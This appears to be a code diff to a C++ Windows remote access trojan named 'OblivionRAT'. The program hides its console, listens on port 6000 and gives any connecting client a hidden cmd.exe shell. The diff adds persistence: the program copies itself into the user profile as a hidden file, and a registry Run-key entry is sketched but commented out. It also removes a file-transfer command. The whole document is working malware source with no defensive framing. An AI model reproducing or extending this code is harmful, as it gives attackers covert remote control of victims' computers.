@@ -16,6 +16,7 @@ Don't forget to link winsock32.lib otherwise your compiler won't understand the 
 #include <windows.h>
 #include <string.h>
 #include <winsock.h>
+#include <iostream>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -35,156 +36,188 @@ DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes availa
 //and the exitcode
 
 void CommandPrompt(void);       //the function to give the command prompt
+void AddToStartup(void);        //function to add the program to startup
+
 int main() //the main function
 {
-	//hide console
-	FreeConsole();
-	//set listen port
-	port = 6000;
-	//tell windows we want to use sockets
-	WSAStartup(0x101, &wsadata);
-	//create socket
-	locsock = socket(AF_INET, SOCK_STREAM, 0);
+    // Add the program to startup
+    AddToStartup();
 
-	//fill structure
-	sinloc.sin_family = AF_INET;
-	sinloc.sin_addr.s_addr = INADDR_ANY;
-	sinloc.sin_port = htons(port);
+    //hide console
+    FreeConsole();
+    //set listen port
+    port = 6000;
+    //tell windows we want to use sockets
+    WSAStartup(0x101, &wsadata);
+    //create socket
+    locsock = socket(AF_INET, SOCK_STREAM, 0);
 
-	//bind the socket to the specified port
-	if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
-	{
-		WSACleanup();
-		printf("Error binding socket.");
-		return EXIT_FAILURE;
-	}
+    //fill structure
+    sinloc.sin_family = AF_INET;
+    sinloc.sin_addr.s_addr = INADDR_ANY;
+    sinloc.sin_port = htons(port);
 
-	//listen on the specified socket
-	if (listen(locsock, 5) == SOCKET_ERROR)
-	{
-		WSACleanup();
-		printf("Error listening socket.");
-		return EXIT_FAILURE;
-	}
+    //bind the socket to the specified port
+    if (bind(locsock, (SOCKADDR*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
+    {
+        WSACleanup();
+        printf("Error binding socket.");
+        return EXIT_FAILURE;
+    }
 
-	//infinite loop here to keep the program listening
-	while (1)
-	{
-		remsock = SOCKET_ERROR;
-		while (remsock == SOCKET_ERROR)
-		{
-			//accept connection to our program
-			remsock = accept(locsock, NULL, NULL);
-			if (remsock == INVALID_SOCKET)
-			{
-				//cleanup and exit program
-				WSACleanup();
-				printf("Error accepting socket.");
-				return EXIT_FAILURE;
-			}
+    //listen on the specified socket
+    if (listen(locsock, 5) == SOCKET_ERROR)
+    {
+        WSACleanup();
+        printf("Error listening socket.");
+        return EXIT_FAILURE;
+    }
 
-			CommandPrompt(); //start the commandprompt function
-		}
-		closesocket(remsock); //close the socket
-	}
-	//we should never reach this point, but i've put this hear just in case 😉
-	return EXIT_SUCCESS;
+    //infinite loop here to keep the program listening
+    while (1)
+    {
+        remsock = SOCKET_ERROR;
+        while (remsock == SOCKET_ERROR)
+        {
+            //accept connection to our program
+            remsock = accept(locsock, NULL, NULL);
+            if (remsock == INVALID_SOCKET)
+            {
+                //cleanup and exit program
+                WSACleanup();
+                printf("Error accepting socket.");
+                return EXIT_FAILURE;
+            }
 
+            CommandPrompt(); //start the commandprompt function
+        }
+        closesocket(remsock); //close the socket
+    }
+    //we should never reach this point, but i've put this hear just in case 😉
+    return EXIT_SUCCESS;
 }
 
 //*************************************************************
 void CommandPrompt(void) //the function which handles the complete commandprompt
 {
-	secat.nLength = sizeof(SECURITY_ATTRIBUTES);
-	secat.bInheritHandle = TRUE;
-	DWORD bytesW;             //number of bytes written gets stored here
-	HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
-	char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
-	char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'
-	char transfer[] = { 't','r','a','n','s','f','e','r',10,0 }; //we need this to compare our command to 'transfer'
+    secat.nLength = sizeof(SECURITY_ATTRIBUTES);
+    secat.bInheritHandle = TRUE;
+    DWORD bytesW;             //number of bytes written gets stored here
+    HANDLE newstdin, newstdout, readout, writein; //the handles for our Pipes
+    char exit1[] = { 'e','x','i','t',10,0 }; //we need this to compare our command to 'exit'
+    char exit2[] = { 'E','X','I','T',10,0 }; //we need this to compare our command to 'EXIT'
 
-	//create the pipes for our command prompt
-	CreatePipe(&newstdin, &writein, &secat, 0);
-	CreatePipe(&readout, &newstdout, &secat, 0);
+    //create the pipes for our command prompt
+    CreatePipe(&newstdin, &writein, &secat, 0);
+    CreatePipe(&readout, &newstdout, &secat, 0);
 
-	GetStartupInfo(&startinfo);
+    GetStartupInfo(&startinfo);
 
-	//fill another structure
-	startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-	startinfo.wShowWindow = SW_HIDE;
-	startinfo.hStdOutput = newstdout;
-	startinfo.hStdError = newstdout;
-	startinfo.hStdInput = newstdin;
+    //fill another structure
+    startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    startinfo.wShowWindow = SW_HIDE;
+    startinfo.hStdOutput = newstdout;
+    startinfo.hStdError = newstdout;
+    startinfo.hStdInput = newstdin;
 
-	wchar_t cmd[] = L"cmd.exe"; //the command we want to start
+    wchar_t cmd[] = L"cmd.exe"; //the command we want to start
 
-	//start cmd prompt
-	CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo);
-	//endless loop
-	while (1)
-	{
-		//check if cmd.exe is still running, if not then cleanup and start listening again.
-		if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
-		{
-			CloseHandle(procinfo.hThread);
-			CloseHandle(procinfo.hProcess);
-			CloseHandle(newstdin);
-			CloseHandle(writein);
-			CloseHandle(readout);
-			CloseHandle(newstdout);
-			break;
-		}
-		bytesRead = 0;
-		//Sleep 0.5 seconds to give cmd.exe the chance to startup
-		Sleep(500);
-		//check if the pipe already contains something we can write to output
-		PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
-		if (bytesRead != 0)
-		{
-			while (bytesRead != 0)
-			{     //read data from cmd.exe and send to client, then clear the buffer
-				int res = ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
-				send(remsock, bufferout, strlen(bufferout), 0);
-				ZeroMemory(bufferout, sizeof(bufferout));
-				Sleep(100);
-				PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
-			}
-		}
-		// clear bufferin
-		ZeroMemory(bufferin, sizeof(bufferin));
-		//receive the command given
-		recv(remsock, bufferin, sizeof(bufferin), 0);
-		//if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
-		//from hanging.
-		if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
-		{
-			//let cmd.exe close by giving the command, then go to closeup label
-			WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
-			goto closeup;
-		}
-		// if command is 'transfer' then we have to capture it to prevent our program
-		else if (strcmp(bufferin, transfer) == 0)
-		{
-			// Wait for the client to send the file name
-			recv(remsock, bufferin, sizeof(bufferin), 0);
-			// Once the file name is received, say file name received and break
-			send(remsock, "File name received", sizeof("File name received"), 0);
-			break;
-		}
-		//else write the command to cmd.exe
-		WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
-		//clear the bufferin
-		for (i = 0; i < sizeof(bufferin); i++)
-		{
-			bufferin[i] = 0;
-		}
-	}
-	//close up all handles
+    //start cmd prompt
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo);
+    //endless loop
+    while (1)
+    {
+        //check if cmd.exe is still running, if not then cleanup and start listening again.
+        if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
+        {
+            CloseHandle(procinfo.hThread);
+            CloseHandle(procinfo.hProcess);
+            CloseHandle(newstdin);
+            CloseHandle(writein);
+            CloseHandle(readout);
+            CloseHandle(newstdout);
+            break;
+        }
+        bytesRead = 0;
+        //Sleep 0.5 seconds to give cmd.exe the chance to startup
+        Sleep(500);
+        //check if the pipe already contains something we can write to output
+        PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
+        if (bytesRead != 0)
+        {
+            while (bytesRead != 0)
+            {     //read data from cmd.exe and send to client, then clear the buffer
+                int res = ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
+                send(remsock, bufferout, strlen(bufferout), 0);
+                ZeroMemory(bufferout, sizeof(bufferout));
+                Sleep(100);
+                PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
+            }
+        }
+        // clear bufferin
+        ZeroMemory(bufferin, sizeof(bufferin));
+        //receive the command given
+        recv(remsock, bufferin, sizeof(bufferin), 0);
+        //if command is 'exit' or 'EXIT' then we have to capture it to prevent our program
+        //from hanging.
+        if ((strcmp(bufferin, exit1) == 0) || (strcmp(bufferin, exit2) == 0))
+        {
+            //let cmd.exe close by giving the command, then go to closeup label
+            WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
+            goto closeup;
+        }
+        //else write the command to cmd.exe
+        WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
+        //clear the bufferin
+        for (i = 0; i < sizeof(bufferin); i++)
+        {
+            bufferin[i] = 0;
+        }
+    }
+    //close up all handles
 closeup:
-	CloseHandle(procinfo.hThread);
-	CloseHandle(procinfo.hProcess);
-	CloseHandle(newstdin);
-	CloseHandle(writein);
-	CloseHandle(readout);
-	CloseHandle(newstdout);
+    CloseHandle(procinfo.hThread);
+    CloseHandle(procinfo.hProcess);
+    CloseHandle(newstdin);
+    CloseHandle(writein);
+    CloseHandle(readout);
+    CloseHandle(newstdout);
+}
+
+wchar_t reg[] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+wchar_t reg2[] = L"MonProgrammeServeur";
+
+void AddToStartup(void)
+{
+    wchar_t buffer[MAX_PATH];
+
+    // Obtenir le chemin du fichier exécutable actuel
+    if (GetModuleFileName(NULL, buffer, MAX_PATH) == 0) {
+        std::wcerr << L"Erreur lors de l'obtention du chemin du fichier exécutable : " << GetLastError() << std::endl;
+    }
+
+    // Définir le chemin de destination en utilisant %userprofile%
+    wchar_t dest[MAX_PATH];
+    ExpandEnvironmentStrings(L"%userprofile%\\OblivionRAT.exe", dest, MAX_PATH);
+
+    // Copier le fichier exécutable vers le répertoire de destination
+    if (!CopyFile(buffer, dest, FALSE)) {
+        std::wcerr << L"Erreur lors de la copie du fichier : " << GetLastError() << std::endl;
+    }
+
+    // Définir l'attribut caché sur le fichier
+    if (!SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN)) {
+        std::wcerr << L"Erreur lors de la définition de l'attribut caché : " << GetLastError() << std::endl;
+    }
+
+    std::wcout << L"Fichier copié avec succès dans : " << dest << std::endl;
+    /*
+    HKEY hKey;
+    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg, 0, KEY_WRITE, &hKey);
+    if (result == ERROR_SUCCESS)
+    {
+        const char* exePath = "C:\\Chemin\\Vers\\VotreProgramme.exe"; // Change this path to your executable path
+        RegSetValueEx(hKey, reg2, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
+        RegCloseKey(hKey);
+    }*/
 }
